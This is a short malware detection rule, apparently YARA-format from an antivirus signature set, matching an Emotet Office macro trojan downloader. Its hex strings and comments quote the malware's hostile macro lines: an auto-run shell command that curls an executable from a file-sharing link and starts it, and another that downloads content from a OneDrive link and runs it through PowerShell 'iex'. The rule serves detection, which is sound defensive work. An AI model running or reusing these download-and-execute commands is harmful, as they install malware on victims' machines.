
rule TrojanDownloader_O97M_Emotet_VRC_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.VRC!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {41 75 74 6f 4f 70 65 6e 20 4d 61 63 72 6f } //1 AutoOpen Macro
		$a_01_1 = {53 68 65 6c 6c 20 28 22 63 6d 64 20 2f 63 20 63 75 72 6c 20 66 69 6c 65 74 72 61 6e 73 66 65 72 2e 69 6f 2f 64 61 74 61 2d 70 61 63 6b 61 67 65 2f 41 75 4e 38 43 69 5a 50 2f 64 6f 77 6e 6c 6f 61 64 20 2d 2d 6f 75 74 70 75 74 20 70 2e 65 78 65 20 26 26 20 73 74 61 72 74 20 70 2e 65 78 65 22 29 } //1 Shell ("cmd /c curl filetransfer.io/data-package/AuN8CiZP/download --output p.exe && start p.exe")
		$a_01_2 = {53 68 65 6c 6c 20 28 41 20 26 20 4f 20 26 20 42 20 26 20 22 27 68 74 74 70 73 3a 2f 2f 6f 6e 65 64 72 69 76 65 2e 6c 69 76 65 2e 63 6f 6d 2f 64 6f 77 6e 6c 6f 61 64 3f 72 65 73 69 64 3d 35 39 32 36 31 43 37 45 34 31 42 36 34 37 38 41 25 32 31 32 31 35 26 61 75 74 68 6b 65 79 3d 21 41 49 4c 78 73 76 7a 6c 5a 62 6f 50 33 69 6f 27 20 2d 55 73 65 42 61 73 69 63 50 61 72 73 69 6e 67 29 2e 43 6f 6e 74 65 6e 74 20 7c 20 69 65 78 20 22 29 } //1 Shell (A & O & B & "'https://onedrive.live.com/download?resid=59261C7E41B6478A%21215&authkey=!AILxsvzlZboP3io' -UseBasicParsing).Content | iex ")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}